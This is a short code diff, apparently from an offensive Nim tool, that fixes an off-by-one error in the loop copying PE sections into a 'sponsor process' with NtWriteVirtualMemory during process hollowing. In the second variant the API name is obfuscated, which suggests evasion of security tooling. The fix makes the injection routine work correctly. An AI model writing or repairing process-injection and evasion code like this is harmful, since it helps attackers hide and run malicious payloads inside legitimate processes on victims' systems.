@@ -92,7 +92,7 @@ when defined(hollow4):
             quit(1)
 
         # Copy PE sections to sponsor process  
-        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
+        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections) - 1):
             if NtWriteVirtualMemory(
                 processHandle,
                 newImageBase + peImageSectionsHeader[i].VirtualAddress,
@@ -226,7 +226,7 @@ when defined(hollow5) or defined(hollow6):
             quit(1)
         
         # Copy PE sections to sponsor process  
-        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections)):
+        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections) - 1):
             if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
                 processHandle,
                 newImageBase + peImageSectionsHeader[i].VirtualAddress,
